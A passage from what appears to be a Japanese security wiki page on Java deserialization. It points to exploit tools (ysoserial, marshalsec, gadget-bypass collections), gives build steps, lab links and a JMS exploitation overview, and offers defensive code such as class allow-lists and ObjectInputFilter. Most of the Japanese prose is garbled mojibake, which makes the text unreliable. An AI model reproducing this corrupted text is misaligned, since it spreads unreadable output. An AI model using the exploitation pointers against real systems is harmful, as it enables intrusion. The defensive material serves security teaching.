ã‚ãªãŸã¯ **use** [**https://github.com/pwntester/SerialKillerBypassGadgetCollection**](https://github.com/pwntester/SerialKillerBypassGadgetCollection) **ã¨ysoserialã‚’çµ„ã¿åˆã‚ã›ã¦ã€ã‚ˆã‚Šå¤šãã®ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆã‚’ä½œæˆã™ã‚‹ã“ã¨ãŒã§ãã¾ã™**ã€‚ã“ã®ãƒ„ãƒ¼ãƒ«ã«é–¢ã™ã‚‹è©³ç´°ã¯ã€ãƒ„ãƒ¼ãƒ«ãŒç™ºè¡¨ã•ã‚ŒãŸ**ãƒˆãƒ¼ã‚¯ã®ã‚¹ãƒ©ã‚¤ãƒ‰**ã«ã‚ã‚Šã¾ã™: [https://es.slideshare.net/codewhitesec/java-deserialization-vulnerabilities-the-forgotten-bug-class?next\_slideshow=1](https://es.slideshare.net/codewhitesec/java-deserialization-vulnerabilities-the-forgotten-bug-class?next\_slideshow=1)

#### marshalsec

[**marshalsec** ](https://github.com/mbechler/marshalsec)ã¯ã€Javaã®ç•°ãªã‚‹**Json**ãŠã‚ˆã³**Yml**ã‚·ãƒªã‚¢ãƒ«åŒ–ãƒ©ã‚¤ãƒ–ãƒ©ãƒªã‚’ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆã™ã‚‹ãŸã‚ã®ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’ç”Ÿæˆã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã§ãã¾ã™ã€‚\
ãƒ—ãƒ­ã‚¸ã‚§ã‚¯ãƒˆã‚’ã‚³ãƒ³ãƒ‘ã‚¤ãƒ«ã™ã‚‹ãŸã‚ã«ã€ç§ã¯`pom.xml`ã«ã“ã®**dependencies**ã‚’**add**ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã—ãŸ:
```markup
<dependency>
<groupId>javax.activation</groupId>
<artifactId>activation</artifactId>
<version>1.1.1</version>
</dependency>

<dependency>
<groupId>com.sun.jndi</groupId>
<artifactId>rmiregistry</artifactId>
<version>1.2.1</version>
<type>pom</type>
</dependency>
```
**Mavenã‚’ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«**ã—ã€**ãƒ—ãƒ­ã‚¸ã‚§ã‚¯ãƒˆã‚’ã‚³ãƒ³ãƒ‘ã‚¤ãƒ«**ã—ã¾ã™:
```bash
sudo apt-get install maven
mvn clean package -DskipTests
```
#### FastJSON

ã“ã®Java JSONãƒ©ã‚¤ãƒ–ãƒ©ãƒªã«ã¤ã„ã¦ã®è©³ç´°ã¯ã€ã“ã¡ã‚‰ã‚’å‚ç…§ã—ã¦ãã ã•ã„: [https://www.alphabot.com/security/blog/2020/java/Fastjson-exceptional-deserialization-vulnerabilities.html](https://www.alphabot.com/security/blog/2020/java/Fastjson-exceptional-deserialization-vulnerabilities.html)

### Labs

* ã„ãã¤ã‹ã®ysoserialãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’ãƒ†ã‚¹ãƒˆã—ãŸã„å ´åˆã¯ã€**ã“ã®ã‚¦ã‚§ãƒ–ã‚¢ãƒ—ãƒªã‚’å®Ÿè¡Œã§ãã¾ã™**: [https://github.com/hvqzao/java-deserialize-webapp](https://github.com/hvqzao/java-deserialize-webapp)
* [https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/](https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/)

### Why

Javaã¯ã€ã•ã¾ã–ã¾ãªç›®çš„ã§å¤šãã®ã‚·ãƒªã‚¢ãƒ«åŒ–ã‚’ä½¿ç”¨ã—ã¾ã™:

* **HTTPãƒªã‚¯ã‚¨ã‚¹ãƒˆ**: ã‚·ãƒªã‚¢ãƒ«åŒ–ã¯ã€ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã€ViewStateã€ã‚¯ãƒƒã‚­ãƒ¼ãªã©ã®ç®¡ç†ã«åºƒãä½¿ç”¨ã•ã‚Œã¦ã„ã¾ã™ã€‚
* **RMI (ãƒªãƒ¢ãƒ¼ãƒˆãƒ¡ã‚½ãƒƒãƒ‰å‘¼ã³å‡ºã—)**: Java RMIãƒ—ãƒ­ãƒˆã‚³ãƒ«ã¯ã€ã‚·ãƒªã‚¢ãƒ«åŒ–ã«å®Œå…¨ã«ä¾å­˜ã—ã¦ãŠã‚Šã€Javaã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã«ãŠã‘ã‚‹ãƒªãƒ¢ãƒ¼ãƒˆé€šä¿¡ã®åŸºç›¤ã§ã™ã€‚
* **HTTPçµŒç”±ã®RMI**: ã“ã®æ–¹æ³•ã¯ã€Javaãƒ™ãƒ¼ã‚¹ã®åšã„ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã‚¦ã‚§ãƒ–ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã«ã‚ˆã£ã¦ä¸€èˆ¬çš„ã«ä½¿ç”¨ã•ã‚Œã€ã™ã¹ã¦ã®ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆé€šä¿¡ã«ã‚·ãƒªã‚¢ãƒ«åŒ–ã‚’åˆ©ç”¨ã—ã¾ã™ã€‚
* **JMX (Javaç®¡ç†æ‹¡å¼µ)**: JMXã¯ã€ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ä¸Šã§ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‚’é€ä¿¡ã™ã‚‹ãŸã‚ã«ã‚·ãƒªã‚¢ãƒ«åŒ–ã‚’åˆ©ç”¨ã—ã¾ã™ã€‚
* **ã‚«ã‚¹ã‚¿ãƒ ãƒ—ãƒ­ãƒˆã‚³ãƒ«**: Javaã§ã¯ã€æ¨™æº–çš„ãªæ…£è¡Œã¨ã—ã¦ã€ç”Ÿã®Javaã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã®é€ä¿¡ãŒå«ã¾ã‚Œã€ä»Šå¾Œã®ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆä¾‹ã§ç¤ºã•ã‚Œã¾ã™ã€‚

### Prevention

#### Transient objects

`Serializable`ã‚’å®Ÿè£…ã™ã‚‹ã‚¯ãƒ©ã‚¹ã¯ã€ã‚·ãƒªã‚¢ãƒ«åŒ–ã•ã‚Œã‚‹ã¹ãã§ãªã„ã‚¯ãƒ©ã‚¹å†…ã®ä»»æ„ã®ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‚’`transient`ã¨ã—ã¦å®Ÿè£…ã§ãã¾ã™ã€‚ä¾‹ãˆã°:
```java
public class myAccount implements Serializable
{
private transient double profit; // declared transient
private transient double margin; // declared transient
```
#### Serializableã‚’å®Ÿè£…ã™ã‚‹å¿…è¦ãŒã‚ã‚‹ã‚¯ãƒ©ã‚¹ã®ã‚·ãƒªã‚¢ãƒ«åŒ–ã‚’é¿ã‘ã‚‹

ç‰¹å®šã®**ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆãŒã‚¯ãƒ©ã‚¹éšå±¤ã®ãŸã‚ã«`Serializable`**ã‚¤ãƒ³ã‚¿ãƒ¼ãƒ•ã‚§ãƒ¼ã‚¹ã‚’å®Ÿè£…ã—ãªã‘ã‚Œã°ãªã‚‰ãªã„ã‚·ãƒŠãƒªã‚ªã§ã¯ã€æ„å›³ã—ãªã„ãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã®ãƒªã‚¹ã‚¯ãŒã‚ã‚Šã¾ã™ã€‚ã“ã‚Œã‚’é˜²ããŸã‚ã«ã€ä»¥ä¸‹ã®ã‚ˆã†ã«å¸¸ã«ä¾‹å¤–ã‚’ã‚¹ãƒ­ãƒ¼ã™ã‚‹`final`ãª`readObject()`ãƒ¡ã‚½ãƒƒãƒ‰ã‚’å®šç¾©ã—ã¦ã€ã“ã‚Œã‚‰ã®ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆãŒãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºä¸å¯èƒ½ã§ã‚ã‚‹ã“ã¨ã‚’ç¢ºèªã—ã¦ãã ã•ã„ã€‚
```java
private final void readObject(ObjectInputStream in) throws java.io.IOException {
throw new java.io.IOException("Cannot be deserialized");
}
```
#### **Javaã«ãŠã‘ã‚‹ãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã®å¼·åŒ–**

**`java.io.ObjectInputStream`ã®ã‚«ã‚¹ã‚¿ãƒã‚¤ã‚º**ã¯ã€ãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºãƒ—ãƒ­ã‚»ã‚¹ã‚’ä¿è­·ã™ã‚‹ãŸã‚ã®å®Ÿç”¨çš„ãªã‚¢ãƒ—ãƒ­ãƒ¼ãƒã§ã™ã€‚ã“ã®æ–¹æ³•ã¯ã€æ¬¡ã®å ´åˆã«é©ã—ã¦ã„ã¾ã™ã€‚

* ãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã‚³ãƒ¼ãƒ‰ãŒã‚ãªãŸã®ç®¡ç†ä¸‹ã«ã‚ã‚‹ã€‚
* ãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã®ãŸã‚ã«æœŸå¾…ã•ã‚Œã‚‹ã‚¯ãƒ©ã‚¹ãŒçŸ¥ã‚‰ã‚Œã¦ã„ã‚‹ã€‚

**`resolveClass()`**ãƒ¡ã‚½ãƒƒãƒ‰ã‚’ã‚ªãƒ¼ãƒãƒ¼ãƒ©ã‚¤ãƒ‰ã—ã¦ã€è¨±å¯ã•ã‚ŒãŸã‚¯ãƒ©ã‚¹ã®ã¿ã«ãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã‚’åˆ¶é™ã—ã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€æ˜ç¤ºçš„ã«è¨±å¯ã•ã‚ŒãŸã‚¯ãƒ©ã‚¹ä»¥å¤–ã®ãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºãŒé˜²æ­¢ã•ã‚Œã¾ã™ã€‚ä»¥ä¸‹ã®ä¾‹ã®ã‚ˆã†ã«ã€ãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã‚’`Bicycle`ã‚¯ãƒ©ã‚¹ã®ã¿ã«åˆ¶é™ã—ã¾ã™ï¼š
```java
// Code from https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html
public class LookAheadObjectInputStream extends ObjectInputStream {

public LookAheadObjectInputStream(InputStream inputStream) throws IOException {
super(inputStream);
}

/**
* Only deserialize instances of our expected Bicycle class
*/
@Override
protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {
if (!desc.getName().equals(Bicycle.class.getName())) {
throw new InvalidClassException("Unauthorized deserialization attempt", desc.getName());
}
return super.resolveClass(desc);
}
}
```
**ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£å¼·åŒ–ã®ãŸã‚ã®Javaã‚¨ãƒ¼ã‚¸ã‚§ãƒ³ãƒˆã®ä½¿ç”¨**ã¯ã€ã‚³ãƒ¼ãƒ‰ã®ä¿®æ­£ãŒä¸å¯èƒ½ãªå ´åˆã®ä»£æ›¿ã‚½ãƒªãƒ¥ãƒ¼ã‚·ãƒ§ãƒ³ã‚’æä¾›ã—ã¾ã™ã€‚ã“ã®æ–¹æ³•ã¯ä¸»ã«**æœ‰å®³ãªã‚¯ãƒ©ã‚¹ã®ãƒ–ãƒ©ãƒƒã‚¯ãƒªã‚¹ãƒˆåŒ–**ã«é©ç”¨ã•ã‚Œã€JVMãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã‚’ä½¿ç”¨ã—ã¾ã™ï¼š
```
-javaagent:name-of-agent.jar
```
å‹•çš„ã«ãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã‚’ä¿è­·ã™ã‚‹æ–¹æ³•ã‚’æä¾›ã—ã€å³æ™‚ã®ã‚³ãƒ¼ãƒ‰å¤‰æ›´ãŒå®Ÿç”¨çš„ã§ãªã„ç’°å¢ƒã«ç†æƒ³çš„ã§ã™ã€‚

[rO0 by Contrast Security](https://github.com/Contrast-Security-OSS/contrast-rO0)ã®ä¾‹ã‚’ç¢ºèªã—ã¦ãã ã•ã„ã€‚

**ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚¼ãƒ¼ã‚·ãƒ§ãƒ³ãƒ•ã‚£ãƒ«ã‚¿ãƒ¼ã®å®Ÿè£…**: Java 9ã¯**`ObjectInputFilter`**ã‚¤ãƒ³ã‚¿ãƒ¼ãƒ•ã‚§ãƒ¼ã‚¹ã‚’ä»‹ã—ã¦ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚¼ãƒ¼ã‚·ãƒ§ãƒ³ãƒ•ã‚£ãƒ«ã‚¿ãƒ¼ã‚’å°å…¥ã—ã€ãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã•ã‚Œã‚‹å‰ã«ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã•ã‚ŒãŸã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆãŒæº€ãŸã™ã¹ãåŸºæº–ã‚’æŒ‡å®šã™ã‚‹ãŸã‚ã®å¼·åŠ›ãªãƒ¡ã‚«ãƒ‹ã‚ºãƒ ã‚’æä¾›ã—ã¾ã™ã€‚ã“ã‚Œã‚‰ã®ãƒ•ã‚£ãƒ«ã‚¿ãƒ¼ã¯ã€ã‚°ãƒ­ãƒ¼ãƒãƒ«ã«ã¾ãŸã¯ã‚¹ãƒˆãƒªãƒ¼ãƒ ã”ã¨ã«é©ç”¨ã§ãã€ãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºãƒ—ãƒ­ã‚»ã‚¹ã«å¯¾ã™ã‚‹è©³ç´°ãªåˆ¶å¾¡ã‚’æä¾›ã—ã¾ã™ã€‚

ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚¼ãƒ¼ã‚·ãƒ§ãƒ³ãƒ•ã‚£ãƒ«ã‚¿ãƒ¼ã‚’åˆ©ç”¨ã™ã‚‹ã«ã¯ã€ã™ã¹ã¦ã®ãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºæ“ä½œã«é©ç”¨ã•ã‚Œã‚‹ã‚°ãƒ­ãƒ¼ãƒãƒ«ãƒ•ã‚£ãƒ«ã‚¿ãƒ¼ã‚’è¨­å®šã™ã‚‹ã‹ã€ç‰¹å®šã®ã‚¹ãƒˆãƒªãƒ¼ãƒ ã®ãŸã‚ã«å‹•çš„ã«æ§‹æˆã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ä¾‹ãˆã°:
```java
ObjectInputFilter filter = info -> {
if (info.depth() > MAX_DEPTH) return Status.REJECTED; // Limit object graph depth
if (info.references() > MAX_REFERENCES) return Status.REJECTED; // Limit references
if (info.serialClass() != null && !allowedClasses.contains(info.serialClass().getName())) {
return Status.REJECTED; // Restrict to allowed classes
}
return Status.ALLOWED;
};
ObjectInputFilter.Config.setSerialFilter(filter);
```
**å¤–éƒ¨ãƒ©ã‚¤ãƒ–ãƒ©ãƒªã‚’æ´»ç”¨ã—ãŸã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã®å¼·åŒ–**: **NotSoSerial**ã€**jdeserialize**ã€ãŠã‚ˆã³**Kryo**ãªã©ã®ãƒ©ã‚¤ãƒ–ãƒ©ãƒªã¯ã€Javaã®ãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã‚’åˆ¶å¾¡ãŠã‚ˆã³ç›£è¦–ã™ã‚‹ãŸã‚ã®é«˜åº¦ãªæ©Ÿèƒ½ã‚’æä¾›ã—ã¾ã™ã€‚ã“ã‚Œã‚‰ã®ãƒ©ã‚¤ãƒ–ãƒ©ãƒªã¯ã€ãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºå‰ã«ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã•ã‚ŒãŸã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‚’åˆ†æã—ãŸã‚Šã€ã‚¯ãƒ©ã‚¹ã®ãƒ›ãƒ¯ã‚¤ãƒˆãƒªã‚¹ãƒˆã‚„ãƒ–ãƒ©ãƒƒã‚¯ãƒªã‚¹ãƒˆã‚’ä½œæˆã—ãŸã‚Šã€ã‚«ã‚¹ã‚¿ãƒ ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºæˆ¦ç•¥ã‚’å®Ÿè£…ã—ãŸã‚Šã™ã‚‹ãªã©ã€è¿½åŠ ã®ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£å±¤ã‚’æä¾›ã§ãã¾ã™ã€‚

* **NotSoSerial**ã¯ã€ä¿¡é ¼ã§ããªã„ã‚³ãƒ¼ãƒ‰ã®å®Ÿè¡Œã‚’é˜²ããŸã‚ã«ãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºãƒ—ãƒ­ã‚»ã‚¹ã‚’å‚å—ã—ã¾ã™ã€‚
* **jdeserialize**ã¯ã€ãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã›ãšã«ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã•ã‚ŒãŸJavaã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‚’åˆ†æã§ãã€æ½œåœ¨çš„ã«æ‚ªæ„ã®ã‚ã‚‹ã‚³ãƒ³ãƒ†ãƒ³ãƒ„ã‚’ç‰¹å®šã™ã‚‹ã®ã«å½¹ç«‹ã¡ã¾ã™ã€‚
* **Kryo**ã¯ã€ã‚¹ãƒ”ãƒ¼ãƒ‰ã¨åŠ¹ç‡ã‚’é‡è¦–ã—ãŸä»£æ›¿ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚¼ãƒ¼ã‚·ãƒ§ãƒ³ãƒ•ãƒ¬ãƒ¼ãƒ ãƒ¯ãƒ¼ã‚¯ã§ã€ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã‚’å¼·åŒ–ã§ãã‚‹æ§‹æˆå¯èƒ½ãªã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚¼ãƒ¼ã‚·ãƒ§ãƒ³æˆ¦ç•¥ã‚’æä¾›ã—ã¾ã™ã€‚

### å‚è€ƒæ–‡çŒ®

* [https://cheatsheetseries.owasp.org/cheatsheets/Deserialization\_Cheat\_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization\_Cheat\_Sheet.html)
* ãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã¨ysoserialã®ãƒˆãƒ¼ã‚¯: [http://frohoff.github.io/appseccali-marshalling-pickles/](http://frohoff.github.io/appseccali-marshalling-pickles/)
* [https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/](https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/)
* [https://www.youtube.com/watch?v=VviY3O-euVQ](https://www.youtube.com/watch?v=VviY3O-euVQ)
* gadgetinspectorã«ã¤ã„ã¦ã®ãƒˆãƒ¼ã‚¯: [https://www.youtube.com/watch?v=wPbW6zQ52w8](https://www.youtube.com/watch?v=wPbW6zQ52w8) ãŠã‚ˆã³ã‚¹ãƒ©ã‚¤ãƒ‰: [https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf](https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf)
* Marshalsecè«–æ–‡: [https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf?raw=true](https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf?raw=true)
* [https://dzone.com/articles/why-runtime-compartmentalization-is-the-most-compr](https://dzone.com/articles/why-runtime-compartmentalization-is-the-most-compr)
* [https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html](https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html)
* [https://deadcode.me/blog/2016/09/18/Blind-Java-Deserialization-Part-II.html](https://deadcode.me/blog/2016/09/18/Blind-Java-Deserialization-Part-II.html)
* Javaã¨.Netã®JSONãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚º **è«–æ–‡:** [**https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf**](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf)**,** ãƒˆãƒ¼ã‚¯: [https://www.youtube.com/watch?v=oUAeWhW5b8c](https://www.youtube.com/watch?v=oUAeWhW5b8c) ãŠã‚ˆã³ã‚¹ãƒ©ã‚¤ãƒ‰: [https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf)
* ãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã®CVE: [https://paper.seebug.org/123/](https://paper.seebug.org/123/)

## JNDIã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ & log4Shell

**JNDIã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ã¨ã¯ä½•ã‹ã€RMIã€CORBAã€LDAPã‚’ä»‹ã—ã¦ã©ã®ã‚ˆã†ã«æ‚ªç”¨ã™ã‚‹ã‹ã€log4shellã‚’ã©ã®ã‚ˆã†ã«æ‚ªç”¨ã™ã‚‹ã‹**ï¼ˆãŠã‚ˆã³ã“ã®è„†å¼±æ€§ã®ä¾‹ï¼‰ã«ã¤ã„ã¦ã¯ã€ä»¥ä¸‹ã®ãƒšãƒ¼ã‚¸ã‚’å‚ç…§ã—ã¦ãã ã•ã„ã€‚

{% content-ref url="jndi-java-naming-and-directory-interface-and-log4shell.md" %}
[jndi-java-naming-and-directory-interface-and-log4shell.md](jndi-java-naming-and-directory-interface-and-log4shell.md)
{% endcontent-ref %}

## JMS - Javaãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ã‚µãƒ¼ãƒ“ã‚¹

> **Javaãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ã‚µãƒ¼ãƒ“ã‚¹**ï¼ˆ**JMS**ï¼‰APIã¯ã€2ã¤ä»¥ä¸Šã®ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆé–“ã§ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ã‚’é€ä¿¡ã™ã‚‹ãŸã‚ã®Javaãƒ¡ãƒƒã‚»ãƒ¼ã‚¸æŒ‡å‘ãƒŸãƒ‰ãƒ«ã‚¦ã‚§ã‚¢APIã§ã™ã€‚ã“ã‚Œã¯ã€ãƒ—ãƒ­ãƒ‡ãƒ¥ãƒ¼ã‚µãƒ¼â€“ã‚³ãƒ³ã‚·ãƒ¥ãƒ¼ãƒãƒ¼å•é¡Œã‚’å‡¦ç†ã™ã‚‹ãŸã‚ã®å®Ÿè£…ã§ã™ã€‚JMSã¯Javaãƒ—ãƒ©ãƒƒãƒˆãƒ•ã‚©ãƒ¼ãƒ ã€ã‚¨ãƒ³ã‚¿ãƒ¼ãƒ—ãƒ©ã‚¤ã‚ºã‚¨ãƒ‡ã‚£ã‚·ãƒ§ãƒ³ï¼ˆJava EEï¼‰ã®ä¸€éƒ¨ã§ã‚ã‚Šã€Sun Microsystemsã§é–‹ç™ºã•ã‚ŒãŸä»•æ§˜ã«ã‚ˆã£ã¦å®šç¾©ã•ã‚Œã¾ã—ãŸãŒã€ãã®å¾ŒJavaã‚³ãƒŸãƒ¥ãƒ‹ãƒ†ã‚£ãƒ—ãƒ­ã‚»ã‚¹ã«ã‚ˆã£ã¦æŒ‡å°ã•ã‚Œã¦ã„ã¾ã™ã€‚ã“ã‚Œã¯ã€Java EEã«åŸºã¥ãã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆãŒãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ã‚’ä½œæˆã€é€ä¿¡ã€å—ä¿¡ã€ãŠã‚ˆã³èª­ã¿å–ã‚‹ã“ã¨ã‚’å¯èƒ½ã«ã™ã‚‹ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ãƒ³ã‚°æ¨™æº–ã§ã™ã€‚ã“ã‚Œã¯ã€åˆ†æ•£ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã®ç•°ãªã‚‹ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆé–“ã®é€šä¿¡ã‚’ç·©ãçµåˆã—ã€ä¿¡é ¼æ€§ãŒé«˜ãã€éåŒæœŸã«ã—ã¾ã™ã€‚ï¼ˆå‡ºå…¸: [Wikipedia](https://en.wikipedia.org/wiki/Java\_Message\_Service)ï¼‰

### è£½å“

ã“ã®ãƒŸãƒ‰ãƒ«ã‚¦ã‚§ã‚¢ã‚’ä½¿ç”¨ã—ã¦ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ã‚’é€ä¿¡ã™ã‚‹è£½å“ã¯ã„ãã¤ã‹ã‚ã‚Šã¾ã™ã€‚

![https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf](<../../.gitbook/assets/image (314).png>)

![https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf](<../../.gitbook/assets/image (1056).png>)

### æ‚ªç”¨

åŸºæœ¬çš„ã«ã€**å±é™ºãªæ–¹æ³•ã§JMSã‚’ä½¿ç”¨ã—ã¦ã„ã‚‹ã‚µãƒ¼ãƒ“ã‚¹ãŒå¤šæ•°å­˜åœ¨ã—ã¾ã™**ã€‚ã—ãŸãŒã£ã¦ã€ã“ã‚Œã‚‰ã®ã‚µãƒ¼ãƒ“ã‚¹ã«ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ã‚’é€ä¿¡ã™ã‚‹ãŸã‚ã®**ååˆ†ãªæ¨©é™**ãŒã‚ã‚‹å ´åˆï¼ˆé€šå¸¸ã¯æœ‰åŠ¹ãªè³‡æ ¼æƒ…å ±ãŒå¿…è¦ï¼‰ã€**æ¶ˆè²»è€…/ã‚µãƒ–ã‚¹ã‚¯ãƒ©ã‚¤ãƒãƒ¼ã«ã‚ˆã£ã¦ãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã•ã‚Œã‚‹æ‚ªæ„ã®ã‚ã‚‹ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‚’é€ä¿¡ã§ãã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™**ã€‚\
ã“ã‚Œã¯ã€ã“ã®æ‚ªç”¨ã«ãŠã„ã¦ã€**ãã®ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ã‚’ä½¿ç”¨ã™ã‚‹ã™ã¹ã¦ã®ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆãŒæ„ŸæŸ“ã™ã‚‹**ã“ã¨ã‚’æ„å‘³ã—ã¾ã™ã€‚

ã‚µãƒ¼ãƒ“ã‚¹ãŒè„†å¼±ã§ã‚ã‚‹å ´åˆï¼ˆãƒ¦ãƒ¼ã‚¶ãƒ¼å…¥åŠ›ã‚’å®‰å…¨ã§ãªã„æ–¹æ³•ã§ãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã—ã¦ã„ã‚‹ãŸã‚ï¼‰ã€è„†å¼±æ€§ã‚’æ‚ªç”¨ã™ã‚‹ãŸã‚ã®æœ‰åŠ¹ãªã‚¬ã‚¸ã‚§ãƒƒãƒˆã‚’è¦‹ã¤ã‘ã‚‹å¿…è¦ãŒã‚ã‚‹ã“ã¨ã‚’å¿˜ã‚Œãªã„ã§ãã ã•ã„ã€‚

